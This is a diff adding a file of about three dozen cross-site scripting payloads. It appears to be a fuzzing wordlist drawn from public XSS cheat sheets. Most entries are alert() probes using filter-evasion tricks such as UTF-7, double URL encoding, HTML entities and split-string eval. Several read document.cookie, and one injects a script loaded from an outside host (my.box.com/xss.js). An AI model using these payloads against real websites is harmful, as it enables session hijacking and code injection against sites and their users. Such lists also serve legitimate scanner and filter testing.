@@ -1,0 +1,36 @@
+'; alert(1);
+')alert(1);//
+<a&#32;href&#61;&#91;&#00;&#93;"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;">XYZ</a
+%253cscript%253ealert(1)%253c/script%253e
+javascript:alert("hellox worldss")
+\\";alert('XSS');//
+&lt;BGSOUND SRC=\"javascript&#058;alert('XSS');\"&gt;
+&lt;LAYER SRC=\"http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html\"&gt;&lt;/LAYER&gt;
+&lt;XSS STYLE=\"behavior&#58; url(xss&#46;htc);\"&gt;
+&lt;XSS STYLE=\"xss&#58;expression(alert('XSS'))\"&gt;
+xss&#58;ex&#x2F;*XSS*//*/*/pression(alert(\"XSS\"))'&gt;
+&lt;BASE HREF=\"javascript&#058;alert('XSS');//\"&gt;
+a=\"get\";
+b=\"URL(\\"\";
+c=\"javascript&#058;\";
+d=\"alert('XSS');\\")\";
+eval(a+b+c+d);
+&lt;XML SRC=\"xsstest&#46;xml\" ID=I&gt;&lt;/XML&gt;
+&lt;?xml&#58;namespace prefix=\"t\" ns=\"urn&#58;schemas-microsoft-com&#58;time\"&gt;
+&lt;?import namespace=\"t\" implementation=\"#default#time2\"&gt;
+&lt;? echo('&lt;SCR)';
+perl -e 'print \"&lt;SCR\0IPT&gt;alert(\\"XSS\\")&lt;/SCR\0IPT&gt;\";' &gt; out
+'';!--\"&lt;XSS&gt;=&{()}
+'';!--"<XSS>=&{()}
+\";alert('XSS');//
+¼script¾alert(¢XSS¢)¼/script¾
+<XSS STYLE="xss:expression(alert('XSS'))">
+a="get";b="URL(ja\"";c="vascr";d="ipt:ale";e="rt('XSS');\")";eval(a+b+c+d+e);
++ADw-script+AD4-alert(document.location)+ADw-/script+AD4-
+%2BADw-script+AD4-alert(document.location)%2BADw-/script%2BAD4-
++ACIAPgA8-script+AD4-alert(document.location)+ADw-/script+AD4APAAi-
+%2BACIAPgA8-script%2BAD4-alert%28document.location%29%2BADw-%2Fscript%2BAD4APAAi-
+%253cscript%253ealert(document.cookie)%253c/script%253e
+%22/%3E%3CBODY%20onload='document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)'%3E
+'; alert(document.cookie); var foo='
+foo\'; alert(document.cookie);//';
